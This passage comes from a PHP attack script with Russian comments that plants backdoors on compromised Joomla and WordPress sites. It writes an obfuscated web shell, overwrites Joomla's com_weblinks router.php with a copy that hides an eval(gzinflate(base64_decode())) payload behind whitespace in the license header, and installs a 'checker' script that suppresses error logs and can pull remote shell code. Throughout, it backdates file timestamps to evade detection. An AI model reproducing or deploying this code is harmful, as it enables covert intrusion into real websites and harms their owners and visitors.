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\'\x29\x29\x29\x3B","");return $a[$i];} ';
			$shell_step_6 = '?>';
			$shell_step_7 = '<?php ';
			$shell_step_8 = '$GLOBALS[\'_792768653_\'][0](_1195823703(0),_1195823703(1),_1195823703(2));';
			$shell_step_9 = '?>';
			$shell_step_10 = '																																																																																					<?php } else { $url_redirect = \'http://\'.$_SERVER[\'SERVER_NAME\']; header("Location: $url_redirect"); exit; } ?>';

			chmod($dir, 0755); // устанавливаем права на папку права на папку
			if (file_exists($path_shell))
				chmod($path_shell, 0755);

			// Создаем шелл	
			if (is_writable($dir))
			{
				$f = fopen ($path_shell, "w");
				fwrite($f, $shell_first_step."\n".$shell_step_1."\n".$shell_step_2.$shell_step_3.$shell_step_4.$shell_step_5.$shell_step_6.$shell_step_7.$shell_step_8.$shell_step_9."\n".$shell_step_10);
				fclose($f);
				
				if (file_exists($path_shell))	
				{
					touch($path_shell, $time_for_touch); 	// Делаем тач шелла на дату, до нашего прихода.
					touch($dir, $time_for_touch); 			// Делаем тач папки на дату, до нашего прихода.
				
					// Вывод результата
					
					$site_name = 'http://'.$_SERVER["SERVER_NAME"];
					$path_shell = str_replace($_SERVER['DOCUMENT_ROOT'], $site_name, $path_shell);	
					$path_shell = $path_shell.'?'.$get;
					
					$server_IP = $_SERVER['SERVER_ADDR'];
					echo '<hr><hr>Unknown CMS - shell upload; '.$path_shell.' ; '.$server_IP.'<hr><hr>';
				}
				else
					echo '<hr><hr>Unknown CMS - Shell could not be created: '.'http://'.$_SERVER["SERVER_NAME"].'<hr><hr>';
			}
			else
				echo '<hr><hr>Unknown CMS - folder not writable: '.'http://'.$_SERVER["SERVER_NAME"].'<hr><hr>';
		}
		else
			echo '<hr><hr>Unknown CMS - Site is empty: '.'http://'.$_SERVER["SERVER_NAME"].'<hr><hr>';
	}
}
//END: upload sh





if (isset ($_GET['af']))
{	
	if 	($CMS == 'Joomla')
	{
		
		$data = 
'<?php
/*
 * @package		Joomla.Site
 * @subpackage	com_weblinks
 * @copyright	Copyright (C) 2005 - 2013 Open Source Matters, Inc. All rights reserved.																																											*/	preg_replace('.'"/.*/e","\x65\x76\x61\x6C\x28\x67\x7A\x69\x6E\x66\x6C\x61\x74\x65\x28\x62\x61\x73\x65\x36\x34\x5F\x64\x65\x63\x6F\x64\x65\x28\'vVjJjpwwEL1Hyj+0WnNILi'.'MwXkCj/MlcZoA+5Rz158e12cYYTDeTHKw2BqpeVb1a6Jf7eBuny+X11+X6fu9ufs1+jbR3zfvd9vSr/Gomvz782eCXpTPl7yv9fjf+ee38Mn4P15/+3F/bjmRYw3s+NxO93020UJY/d/4Z59+3rf9VtIdzNUT9jd+7z+U1rBwXXKO8jvSjrCOYWXfADnIsyQjYhzUmWSVsskCvMyx/jD5AXCcxdTW9DevWZb2mY71ej7HJXmIG9zs6016maRgjYLZ0pkd6T3seaY9ZT3R9FqPwAnwA+tAXhjk6kn8sxxnjq/iZW5Rn2e9qzrgNZxwL3OfXOS5Fsd+zxU7Edas5ViriWsmDvGuXejtYLq6qvo5tBblD5PiCa3s2CQb5BR9xrgcfVTBsYsvz0vLZSDGBeGJs0pzV9Fv1WQXvVo4ezdfFc0kdQQ5ybDHWYseYnA2Mtad4lv13ffv+7eU+TLOVOlzSjfan9iW5YWfG5ejaJM/pnbqxG8s93RP1CeEb1vb5fKxO42EOSZ2QmoDx0oQXMTrCkOJSB3LsEIaOOXCLfEGdB2W76bne8Ux93IxFrRamGA7EDt6R/A+ctQX+NBm2xIc4C9i4x1yb2S7OP7RFRw7k2G17DC9gg1xCG4fYO6Smoi0nfYL2b3FFdDxZb/F95rv4Rvz7VM8v3b893uNL3A5zYc/5yT7V4psh4peZwIzR7yU7w33OS8W9Hmeojq85P6JvqA7PptdSh9P6EepmG/kAulVL87LleQNqAPI388HK9v8wS4c+O8e+aqX+ZfzBHljgVPDxwDNMmsPJ+SoXe+ZXYTaUc+zP7K9FLS74L2CR7wKpAdksscKR4k3exf2Q+L2Uawe/LxBHPuflfuNZJP2Oqs0fJW6gzD6zK6ujZ7DU5iGoizJHiM8DvqR25fdDn5K8axnTFtZ+iRPzbMr6R0s6Qu3csenInLfy9449gif0AOHxELkmsVjE76isVN5OrT86vz6TO1B30toifSN/rzbX7M0063tUh01jTD4Pl/pljT+P9KLFWZ77Mq+k/JV6msb3ifqU9iWU8Un33Ebst+K9ejfNO5mJB9Id8Ga6tvz1Fd9wob7neg/w3InvZCaYScZR2SW7duP9BfaGuVX+hxBOMIetq9tes/sRHQsfnOltjv3tKtgV8zx/X+K1E5t/gWdz1iz4UDG+Ijaz7DsP6dqZa+szKttult97iFnk6W3sKd/pv97r2/zn4/ePF/ob+PXC/0PABgdh2'.'EAl/vn2Fw==\'\x29\x29\x29\x3B",""); /*
 * @license		GNU General Public License version 2 or later; see LICENSE.txt
 */

 /* Weblinks Component Route Helper
 *
 * @package		Joomla.Site
 * @subpackage	com_weblinks
 * @since 1.6
 */

defined(\'_JEXEC\') or die;

jimport(\'joomla.application.categories\');

/**
 * Build the route for the com_weblinks component
 *
 * @param	array	An array of URL arguments
 *
 * @return	array	The URL arguments to use to assemble the subsequent URL.
 */
function WeblinksBuildRoute(&$query)
{
	$segments = array();

	// get a menu item based on Itemid or currently active
	$app		= JFactory::getApplication();
	$menu		= $app->getMenu();
	$params		= JComponentHelper::getParams(\'com_weblinks\');
	$advanced	= $params->get(\'sef_advanced_link\', 0);

	// we need a menu item.  Either the one specified in the query, or the current active one if none specified
	if (empty($query[\'Itemid\'])) {
		$menuItem = $menu->getActive();
	}
	else {
		$menuItem = $menu->getItem($query[\'Itemid\']);
	}

	$mView	= (empty($menuItem->query[\'view\'])) ? null : $menuItem->query[\'view\'];
	$mCatid	= (empty($menuItem->query[\'catid\'])) ? null : $menuItem->query[\'catid\'];
	$mId	= (empty($menuItem->query[\'id\'])) ? null : $menuItem->query[\'id\'];

	if (isset($query[\'view\'])) {
		$view = $query[\'view\'];

		if (empty($query[\'Itemid\'])) {
			$segments[] = $query[\'view\'];
		}

		// We need to keep the view for forms since they never have their own menu item
		if ($view != \'form\') {
			unset($query[\'view\']);
		}
	}

	// are we dealing with an weblink that is attached to a menu item?
	if (isset($query[\'view\']) && ($mView == $query[\'view\']) and (isset($query[\'id\'])) and ($mId == intval($query[\'id\']))) {
		unset($query[\'view\']);
		unset($query[\'catid\']);
		unset($query[\'id\']);

		return $segments;
	}

	if (isset($view) and ($view == \'category\' or $view == \'weblink\' )) {
		if ($mId != intval($query[\'id\']) || $mView != $view) {
			if ($view == \'weblink\' && isset($query[\'catid\'])) {
				$catid = $query[\'catid\'];
			}
			elseif (isset($query[\'id\'])) {
				$catid = $query[\'id\'];
			}

			$menuCatid = $mId;
			$categories = JCategories::getInstance(\'Weblinks\');
			$category = $categories->get($catid);

			if ($category) {
				//TODO Throw error that the category either not exists or is unpublished
				$path = $category->getPath();
				$path = array_reverse($path);

				$array = array();
				foreach($path as $id)
				{
					if ((int) $id == (int)$menuCatid) {
						break;
					}

					if ($advanced) {
						list($tmp, $id) = explode(\':\', $id, 2);
					}

					$array[] = $id;
				}
				$segments = array_merge($segments, array_reverse($array));
			}

			if ($view == \'weblink\') {
				if ($advanced) {
					list($tmp, $id) = explode(\':\', $query[\'id\'], 2);
				}
				else {
					$id = $query[\'id\'];
				}

				$segments[] = $id;
			}
		}

		unset($query[\'id\']);
		unset($query[\'catid\']);
	}

	if (isset($query[\'layout\'])) {
		if (!empty($query[\'Itemid\']) && isset($menuItem->query[\'layout\'])) {
			if ($query[\'layout\'] == $menuItem->query[\'layout\']) {
				unset($query[\'layout\']);
			}
		}
		else {
			if ($query[\'layout\'] == \'default\') {
				unset($query[\'layout\']);
			}
		}
	};

	return $segments;
}
/**
 * Parse the segments of a URL.
 *
 * @param	array	The segments of the URL to parse.
 *
 * @return	array	The URL attributes to be used by the application.
 */
function WeblinksParseRoute($segments)
{
	$vars = array();

	//Get the active menu item.
	$app	= JFactory::getApplication();
	$menu	= $app->getMenu();
	$item	= $menu->getActive();
	$params = JComponentHelper::getParams(\'com_weblinks\');
	$advanced = $params->get(\'sef_advanced_link\', 0);

	// Count route segments
	$count = count($segments);

	// Standard routing for weblinks.
	if (!isset($item)) {
		$vars[\'view\']	= $segments[0];
		$vars[\'id\']		= $segments[$count - 1];
		return $vars;
	}

	// From the categories view, we can only jump to a category.
	$id = (isset($item->query[\'id\']) && $item->query[\'id\'] > 1) ? $item->query[\'id\'] : \'root\';

	$category = JCategories::getInstance(\'Weblinks\')->get($id);

	$categories = $category->getChildren();
	$found = 0;

	foreach($segments as $segment)
	{
		foreach($categories as $category)
		{
			if (($category->slug == $segment) || ($advanced && $category->alias == str_replace(\':\', \'-\', $segment))) {
				$vars[\'id\'] = $category->id;
				$vars[\'view\'] = \'category\';
				$categories = $category->getChildren();
				$found = 1;

				break;
			}
		}

		if ($found == 0) {
			if ($advanced) {
				$db = JFactory::getDBO();
				$query = \'SELECT id FROM #__weblinks WHERE catid = \'.$vars[\'id\'].\' AND alias = \'.$db->Quote(str_replace(\':\', \'-\', $segment));
				$db->setQuery($query);
				$id = $db->loadResult();
			}
			else {
				$id = $segment;
			}

			$vars[\'id\'] = $id;
			$vars[\'view\'] = \'weblink\';

			break;
		}

		$found = 0;
	}

	return $vars;
}
';

		$htach_1 = $_SERVER['DOCUMENT_ROOT']."/components/.htaccess";
		$htach_2 = $_SERVER['DOCUMENT_ROOT']."/components/com_weblinks/.htaccess";
		
		if (file_exists($htach_1))
			remove_file($htach_1);
			
		if (file_exists($htach_2))
			remove_file($htach_2);
		
		$path_folder_com_contact = $_SERVER['DOCUMENT_ROOT']."/components/com_contact/";
		$path_folder_com_weblinks = $_SERVER['DOCUMENT_ROOT']."/components/com_weblinks/";
		$path_router = $_SERVER['DOCUMENT_ROOT']."/components/com_weblinks/router.php";
			
		if (file_exists($path_router))
		{
			$time_orinal_file = filemtime($path_router);	// Узнаем дату его посл. изменения
			chmod($path_router, 0755);
			
			$f = fopen ($path_router, "w");
			fwrite($f, $data);
			fclose($f);
			
			$router_for_check = only_read($path_router);
			
			$search_str = 'x65\x76\x61\x6C\x28\x67\x7A\x69\x6E\x66\x6C\x61\x74';
			$find_code = stristr($router_for_check, $search_str);
			
			if ($find_code !== false)
			{
				echo '<hr><hr>http://'.$_SERVER["SERVER_NAME"].' - AF client installed correct!<hr><hr>';
				touch($path_router, $time_orinal_file);
				touch($path_folder_com_weblinks, $time_orinal_file);
			}
			else
			{
				echo '<hr><hr>http://'.$_SERVER["SERVER_NAME"].' - AF client not installed<hr><hr>';
				touch($path_router, $time_orinal_file);
				touch($path_folder_com_weblinks, $time_orinal_file);
			}
		}	
		else
		{
			if (is_dir($path_folder_com_weblinks))
			{
				$time_orinal_file = filemtime($path_folder_com_weblinks);
				
				$f = fopen ($path_router, "w");
				fwrite($f, $data);
				fclose($f);	
				
				$router_for_check = only_read($path_router);
				
				$search_str = 'x65\x76\x61\x6C\x28\x67\x7A\x69\x6E\x66\x6C\x61\x74';
				$find_code = stristr($router_for_check, $search_str);
				
				if ($find_code !== false)
				{
					echo '<hr><hr>http://'.$_SERVER["SERVER_NAME"].' - AF client installed correct!<hr><hr>';
					touch($path_router, $time_orinal_file);
					touch($path_folder_com_weblinks, $time_orinal_file);
				}
				else
				{
					echo '<hr><hr>http://'.$_SERVER["SERVER_NAME"].' - AF client not installed<hr><hr>';
					touch($path_router, $time_orinal_file);
					touch($path_folder_com_weblinks, $time_orinal_file);
				}
			}
			else
			{
				mkdir($path_folder_com_weblinks, 0755);
				if (is_dir($path_folder_com_weblinks))
				{
					$time_orinal_file = filemtime($path_folder_com_contact);
					
					$f = fopen ($path_router, "w");
					fwrite($f, $data);
					fclose($f);	
					
					$router_for_check = only_read($path_router);
					
					$search_str = 'x65\x76\x61\x6C\x28\x67\x7A\x69\x6E\x66\x6C\x61\x74';
					$find_code = stristr($router_for_check, $search_str);
					
					if ($find_code !== false)
					{
						echo '<hr><hr>http://'.$_SERVER["SERVER_NAME"].' - AF client installed correct!<hr><hr>';
						touch($path_router, $time_orinal_file);
						touch($path_folder_com_weblinks, $time_orinal_file);
					}
					else
					{
						echo '<hr><hr>http://'.$_SERVER["SERVER_NAME"].' - AF client not installed<hr><hr>';
						touch($path_router, $time_orinal_file);
						touch($path_folder_com_weblinks, $time_orinal_file);
					}
				}
			}
		}
	}
}
// END: AF Client

// Start Monitoring
if (isset ($_GET['mon']))
{
	$arr_dir = finder_files($_SERVER['DOCUMENT_ROOT']);
	foreach ($arr_dir as $each)
	{
		// Исключаем папки tmp, cache, logs
		$iskl_dir1 = stristr($each, '/tmp/'); 
		$iskl_dir2 = stristr($each, '/cache/'); 
		$iskl_dir3 = stristr($each, '/logs/');
			
		// Подходящие папки для загрузки
		$good_dir1 = stristr($each, '/administrator/'); 
		$good_dir2 = stristr($each, '/components/');
		$good_dir3 = stristr($each, '/images/'); 
		$good_dir4 = stristr($each, '/includes/');
		$good_dir5 = stristr($each, '/language/'); 
		$good_dir6 = stristr($each, '/libraries/');
		$good_dir7 = stristr($each, '/media/'); 
		$good_dir8 = stristr($each, '/modules/');
		$good_dir9 = stristr($each, '/plugins/'); 
		$good_dir10 = stristr($each, '/templates/');
		$good_dir11 = stristr($each, '/wp-includes/'); 
		$good_dir12 = stristr($each, '/wp-content/'); 
		$good_dir13 = stristr($each, '/wp-admin/');

				
		// Собираем подходящие нам пути
		if (($iskl_dir1 == false) and ($iskl_dir2 == false) and ($iskl_dir3 == false))
		{
			if (($good_dir1 != false) or ($good_dir2 != false) or ($good_dir3 != false) or ($good_dir4 != false) or ($good_dir5 != false) or ($good_dir6 != false) or ($good_dir7 != false) or ($good_dir8 != false) or ($good_dir9 != false) or ($good_dir10 != false) or ($good_dir11 != false) or ($good_dir12 != false) or ($good_dir13 != false))
			{
				$count_slash = substr_count($each, '/');
				$arr_all_folder[$count_slash] = $each;
			}
		}
	}

	// Определяем наиболее дальнюю папку	$arr_last_folder[0]
	krsort($arr_all_folder);

	foreach ($arr_all_folder as $folder)
	{
		$arr_last_folder[] = trim($folder);
	}

	// Выбираем рандомно последнюю, предыпоследнюю, либо третью с конца по дальности расположения папку.
	$key_array = 2;

	// Приводим путь к виду /dir/dir2/dir3
	$dir = str_replace(substr(strrchr($arr_last_folder[$key_array], "/"), 1), "", $arr_last_folder[$key_array]);	
	$path_to_all_files = $dir.'all.txt';
	$path_to_all_result = $dir.'result.html';
	$path_to_checker = $dir.'com_checker.php';

	$time_for_touch = filemtime($dir);

	$sitename = $_SERVER['SERVER_NAME'];
	
	if (!file_exists($path_to_all_result))
	{
		$ff2 = fopen ($path_to_all_result, "a");
		fwrite($ff2, $sitename."\n"."\n");
		fclose($ff2);
	}

$data =
'<?php
@ini_set(\'error_log\',NULL);
@ini_set(\'log_errors\',0);
ini_set(\'display_errors\', 0);
error_reporting(0);
ignore_user_abort(true);

$arr_filename = array();
function finder_files($start) 
{
	global $arr_filename;
	$files = array();
	$handle = opendir($start);
	while(($file=readdir($handle))!==false)
	{	
		if ($file!="." && $file !="..") 
		{
			$startfile = $start."/".$file;
			if (is_dir($startfile)) 
				finder_files($startfile);
			else 
			{
				$iskl_1 = stristr($startfile, \'/all.txt\');
				$iskl_2 = stristr($startfile, \'/com_checker.php\');
				$iskl_3 = stristr($startfile, \'/result.html\');

				if (($iskl_1 == false) and ($iskl_2 == false) and ($iskl_3 == false))
				{
					$startfile .= \'-*-\'.filesize($startfile);
					$arr_filename[] = $startfile;
				}
			}
		}
	}
	closedir($handle);
	return $arr_filename;
}

function read_file($file_name)
{
	if (file_exists($file_name) and (filesize($file_name)>1))
	{
		$file = fopen($file_name,"rt");
		$arr_file = explode("\n",fread($file,filesize($file_name)));
		fclose($file);
	}
	else
		$arr_file = array();
	
	return $arr_file;
}

function get_shell_path($link, $filename)
{
	if (!copy($link, $filename)) 
	{
		$shell_list = file_get_contents($link);
		if (($shell_list !== "") and ($shell_list !== " ") and ($shell_list !== null))
		{
			$f = fopen ($filename, "w");
			fwrite($f, $shell_list);
			fclose($f);
		}
		else
		{
			$ch = curl_init($link);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
			  
			$data = curl_exec($ch);
			curl_close($ch);
			  
			file_put_contents($filename, $data);
		}
	}
}

if (isset ($_GET[\'start\']))
{
	$script_way = $_SERVER[\'DOCUMENT_ROOT\'].$_SERVER[\'SCRIPT_NAME\'];
	$script_way = str_replace(\'com_checker.php\', "", $script_way);
	$time_for_touch_all = filemtime($script_way);
	
	$sitename = $_SERVER[\'SERVER_NAME\'];
	
	if ((!file_exists(\'result.html\')) or ((filesize(\'result.html\') < 2)))
	{
		$ff2 = fopen (\'result.html\', "a");
		fwrite($ff2, $sitename."\n"."\n");
		fclose($ff2);
	}
	
	$script_way = $_SERVER[\'DOCUMENT_ROOT\'].$_SERVER[\'SCRIPT_NAME\'];
	$script_way = str_replace(\'com_checker.php\', "", $script_way);
	$time_for_touch_all = filemtime($script_way);
	
	$arr_all_file_with_time = finder_files($_SERVER[\'DOCUMENT_ROOT\']);
	
	$path_to_all_files = \'all.txt\';
	
	$f = fopen ($path_to_all_files, "w");
	foreach ($arr_all_file_with_time as $each)
	{	
		fwrite($f, $each."\n");
	}
	fclose($f);
	
	if (file_exists(\'com_checker.php\'))
		touch(\'com_checker.php\', $time_for_touch_all);
	if (file_exists(\'result.html\'))
		touch(\'result.html\', $time_for_touch_all);
	if (file_exists(\'all.txt\'))
		touch(\'all.txt\', $time_for_touch_all);
	if (file_exists($script_way))
		touch($script_way, $time_for_touch_all);
}

if (isset ($_GET[\'check\']))
{
	$script_way = $_SERVER[\'DOCUMENT_ROOT\'].$_SERVER[\'SCRIPT_NAME\'];
	$script_way = str_replace(\'com_checker.php\', "", $script_way);
	$time_for_touch_all = filemtime($script_way);
	
	$arr_old_files_with_time = read_file(\'all.txt\');
	
	$arr_old_files = array();
	
	$my_str = \'-*-\'; // Символ до которого нужно скопировать код.
	foreach ($arr_old_files_with_time as $each)
	{	
		$each = trim($each);
		$pos_end = strpos($each, $my_str); // Узнаем позицию символа $my_str
		$each = substr_replace($each, \'\', $pos_end, 9999999); // Удаляем все, начиная с символа - my_str по 9999999 символ
		$arr_old_files[] = $each;
	}
	
	$arr_all_file_with_time = finder_files($_SERVER[\'DOCUMENT_ROOT\']);

	// STRAT: Оставляем только имена файлов для последующей записи в текст. док.

	$arr_only_filename = array();
	$my_str = \'-*-\'; // — символ до которого нужно скопировать код.

	$f2 = fopen ("all.txt", "w");
	foreach ($arr_all_file_with_time as $each)
	{	
		$each = trim($each);
		fwrite($f2, $each."\n");
		$pos_end = strpos($each, $my_str); // ”знаем позицию символа $my_str
		$each = substr_replace($each, \'\', $pos_end, 9999999); // Удаляем все, начиная с символа - my_str по 9999999 символ
		$arr_only_filename[] = $each;
	}
	fclose($f2);
	//END: Оставляем только имена файлов для последующей записи в текст. док.

	$element_for_delete = (count($arr_old_files))-1;
	unset($arr_old_files[$element_for_delete]);
	
	$element_for_delete2 = (count($arr_old_files_with_time))-1;
	unset($arr_old_files_with_time[$element_for_delete2]);
	
	$result = array_diff ($arr_only_filename, $arr_old_files); // Узнаем новые файлы
	$result2 = array_diff ($arr_old_files, $arr_only_filename); // Узнаем удаленные файлы
	$result3 = array_diff ($arr_all_file_with_time, $arr_old_files_with_time); // Узнаем измененные файлы
	$result4 = array();
	
	foreach ($result3 as $changed_file)
	{
		$changed_file = trim($changed_file);

		$for_check = $changed_file;

		$my_str = \'-*-\';
		$pos_end = strpos($for_check, $my_str); // ”знаем позицию символа $my_str
		$for_check = substr_replace($for_check, \'\', $pos_end, 9999999); // Удаляем все, начиная с символа - my_str по 9999999 символ
			
		if (!in_array($for_check, $result)) 
			$result4[] = $changed_file;
	}
	
	//START: Записываем результаты проверки
	
	$today_date = date(\'Y-m-d H:i:s\');
	
	$today_date = "<br>"."\n"."= = =  $today_date  = = ="."\n"."<br>"."\n"."<br>"; 
	$new_files_create = "<b>New files has been created:</b>"."\n"."<br>";
	$files_delete = "<b>This files has been deleted:</b>"."\n"."<br>";
	$files_are_changed = "<b>This files has been changed:</b>"."\n"."<br>";
	$f = fopen ("result.html", "a");
	
	fwrite($f, $today_date);
	fwrite($f, $new_files_create);
	
if ($result != null)
{
	foreach ($result as $new_files)
	{
		$new_files = trim($new_files);
		$new_files_len = strlen($new_files);
		if ($new_files_len > 5)
		{
			$new_files = str_replace($_SERVER[\'DOCUMENT_ROOT\'], $_SERVER[\'SERVER_NAME\'], $new_files);
			$new_files = \'<a href = "http://\'.$new_files.\'">\'.$new_files.\'</a>\';

			fwrite($f, $new_files."\n"."<br>");
		}
	}
}

